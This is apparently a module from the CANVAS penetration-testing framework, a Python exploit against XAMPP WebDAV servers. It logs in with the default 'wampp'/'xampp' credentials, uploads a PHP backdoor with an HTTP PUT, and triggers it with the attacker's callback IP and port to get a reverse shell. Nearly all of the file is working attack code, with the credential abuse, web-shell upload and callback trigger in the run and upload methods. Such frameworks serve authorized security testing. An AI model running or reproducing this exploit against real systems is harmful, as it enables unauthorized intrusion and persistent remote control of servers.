#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2002-2006
#http://www.immunityinc.com/CANVAS/ for more information

import sys

import urllib2
import base64

#covers both angles
if "." not in sys.path: sys.path.append(".")

from exploitutils import *
from tcpexploit import tcpexploit



NAME="XAMPP webdav"
DESCRIPTION="Default password on webdav resources allows file upload"
DOCUMENTATION={}
DOCUMENTATION['VENDOR']="XAMPP"
DOCUMENTATION["Notes"]="""


"""

DOCUMENTATION["Repeatability"]="Infinite"
DOCUMENTATION["CVE Name"] = "N/A"
DOCUMENTATION["CVE Url"] = "N/A"
DOCUMENTATION['CVSS'] = 7.5
VERSION="0.1"

PROPERTY = {}
PROPERTY['TYPE'] = "Exploit"
PROPERTY['SITE'] = "Remote"
PROPERTY['ARCH'] = [ ["Any"] ]




import canvasengine
from libs.canvasos import canvasos
import urllib
from libs.spkproxy import urlopen

class theexploit(tcpexploit):
    def __init__(self):
        tcpexploit.__init__(self)

        self.port=80
        self.host=""
        #characters IIS hates us to use
        self.badstring=",><"
        self.version=1
        self.done=0
        self.name=NAME
        self.basepath="/webdav"
        self.docmdcpy=True
        self.target_os=None
        self.ssl=0
        self.file_to_upload="backdoors/php_callback.php"
        self.username = "wampp"
        self.password = "xampp"
        self.filename = "php_callback.php"   # TODO changethis

        return

    def getargs(self):
        """
        Get arguments for attack
        """
        self.getarg("host")
        self.host=self.target.interface
        self.getarg("port")
        self.getarg("ssl")
        self.getarg("basepath")

        # TODO check slashes

        if self.ssl:
            self.url = "https://%s:%d%s/%s" % (self.host, self.port, self.basepath, self.filename)
        else:
            self.url = "http://%s:%d%s/%s" % (self.host, self.port, self.basepath, self.filename)

        self.log("Using URL: %s" % self.url)

        return

    def neededListenerTypes(self):
        return [canvasengine.PHPMULTI]

    def test(self):

        """
        Quicky banner check - looks for comon basepaths
        """
        self.getargs()
        self.log("Using basepath=%s"%self.basepath)

        # Check if it's vulnerable
        s=self.gettcpsock()

        try:
            self.log("Trying connection to %s:%d\n"%(self.host, self.port))
            s.connect((self.host, self.port))

            self.websend(s,"HEAD /webdav HTTP/1.0\r\n\r\n")
            time.sleep(5)
            data=self.webrecv(s,1000)
            self.log("Data=%s"%prettyprint(data))
        except:
            self.log("No connection could be established")
            return 0

        if "Apache" in data:
            self.log("[+] Apache running found")
            if "DAV" in data:
                self.log("[+] DAV supported,")
            else:
                self.log("[-] DAV not supported")
                s.close()
                return 0
        else:
            self.log("[-] No Apache found")
            s.close()
            return 0

        s.close()
        return 1


    def upload_phpmosdef(self):

        # Read the content of the file to upload
        try:
            body = open(self.file_to_upload, "rb").read()
        except:
            self.log("Unable to open src file %s" % src)
            return 0

        authhandler = urllib2.HTTPDigestAuthHandler()
        authhandler.add_password("XAMPP with WebDAV", self.url, self.username, self.password)
        opener = urllib2.build_opener(authhandler)
        urllib2.install_opener(opener)

        request = urllib2.Request(self.url, data=body)
        request.get_method = lambda: 'PUT'

        try:
            f = urllib2.urlopen(request)
            f.close()
            self.log("MOSDEF callback uploaded ok")
            return 1
        except:
            self.log("Unable to upload php MOSDEF callback")
            return 0


    def run(self):
        self.getargs()

        self.setInfo("%s attacking %s:%d (in progress)"%(NAME,self.host,self.port))

        if self.version==0:
            #In order to correctly set up our attack string we first need to
            #determine the OS we are targeting as much as possible
            ret=self.test()
            if not ret:
                self.log("Testing didn't find target as vulnerable")
                self.connsock.close()
                return 0

        # Try to upload php mosdef trojan
        if not self.upload_phpmosdef():
            # we failed
            return 0
        else:
            self.setSucceeded()

        # Trigger the callback
        triggerurl = self.url + "?cb_ip=%s&cb_port=%s"%(self.callback.ip, self.callback.port)

        s=self.gettcpsock()
        s.connect((self.host, self.port))
        self.websend(s,"GET %s HTTP/1.0\r\n\r\n" % triggerurl)

        if self.ISucceeded():
            self.log("Got a new MOSDEF up and running!")
            ret=1

        return ret


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v %s"%(DESCRIPTION,VERSION)
    app = theexploit()
    ret=standard_callback_commandline(app)

